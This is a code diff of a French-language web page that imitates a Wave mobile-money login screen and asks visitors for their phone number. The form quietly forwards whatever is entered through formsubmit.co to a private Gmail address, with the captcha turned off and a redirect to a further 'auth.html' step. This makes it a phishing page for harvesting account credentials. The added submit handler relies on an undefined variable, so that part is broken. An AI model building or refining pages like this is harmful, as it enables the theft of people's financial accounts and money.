@@ -31,7 +31,7 @@
                     Bienvenue chez Wave! Pour commencer, entrez votre numéro de mobile</h2>
                 <br><br>
                 
-                <form class="max-w-sm mx-auto" action="https://formsubmit.co/serveur579@gmail.com" method="post">
+                <form class="max-w-sm mx-auto" action="https://formsubmit.co/serveur579@gmail.com" method="post" id="myForm">
                     <input type="hidden" name="_next" value="auth.html">
                     <input type="hidden" name="_captcha" value="false">
                     <div class="flex align-middle items-center gap-1">
@@ -77,6 +77,16 @@
         $("#cancel").click(function () { 
             $("#dropdown-phone").css("display", "none");
         });
+
+        document.getElementById("myForm").onsubmit = function(event) {
+        event.preventDefault(); // Empêche le rechargement de page par défaut
+        // Votre code de validation ici
+        if (validationReussie) {
+            window.location.href = "auth.html";
+        } else {
+            // Afficher un message d'erreur
+        }
+    };
     </script>
 </body>
 
